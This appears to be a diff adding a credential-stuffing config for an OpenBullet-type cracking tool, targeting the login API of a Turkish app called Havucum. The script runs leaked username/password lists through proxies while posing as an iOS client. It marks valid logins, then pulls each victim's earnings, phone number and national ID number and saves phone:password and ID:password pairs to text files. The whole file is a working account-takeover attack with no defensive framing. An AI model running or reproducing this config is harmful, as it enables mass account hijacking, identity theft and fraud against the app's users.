@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "iOS API Havucum",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-04T01:22:21.9709357+03:00",
+  "AdditionalInfo": "",
+  "Author": "KaraMeleKk",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "guid" 
+
+FUNCTION ToUppercase "<guid>" -> VAR "deviceid" 
+
+REQUEST POST "https://api.havucum.com/api/v2/Auth/login" 
+  CONTENT "{\"password\":\"<PASS>\",\"lang\":\"en\",\"oneSignalId\":\"8fc9adf3-665e-489a-bb8e-c854e280cc6a\",\"iosDeviceId\":\"<deviceid>\",\"loginName\":\"<USER>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "authorization: Bearer" 
+  HEADER "clientid: ios" 
+  HEADER "user-agent: Havucum/4 CFNetwork/1329 Darwin/21.3.0" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+
+#token1 PARSE "<SOURCE>" LR "accessToken\":{\"token\":\"" "\"" -> VAR "token1" 
+
+#userguid PARSE "<SOURCE>" JSON "userGuid" -> VAR "userguid" 
+
+REQUEST GET "https://api.havucum.com/api/v2/Profile/getProfile?userGuid=<userguid>" 
+  
+  HEADER "authorization: Bearer <token1>" 
+  HEADER "clientid: ios" 
+  HEADER "user-agent: Havucum/4 CFNetwork/1329 Darwin/21.3.0" 
+
+PARSE "<SOURCE>" JSON "totalEarned" CreateEmpty=FALSE -> CAP "Toplam Kazanılan" 
+
+PARSE "<SOURCE>" JSON "totalEarned" CreateEmpty=FALSE -> CAP "Toplam Çekilmiş Tutar" 
+
+#Telefon PARSE "<SOURCE>" JSON "phoneNumber" CreateEmpty=FALSE -> CAP "Telefon" 
+
+#TC PARSE "<SOURCE>" JSON "tckn" CreateEmpty=FALSE -> CAP "TC" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "phoneNumber\":null" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "phoneNumber\":null" 
+
+#TelKaydet UTILITY File "Havucum.com Telpass.txt" AppendLines "<Telefon>:<PASS>" 
+
+#TCKaydet UTILITY File "Havucum.com Tcpass.txt" AppendLines "<TC>:<PASS>" 
+
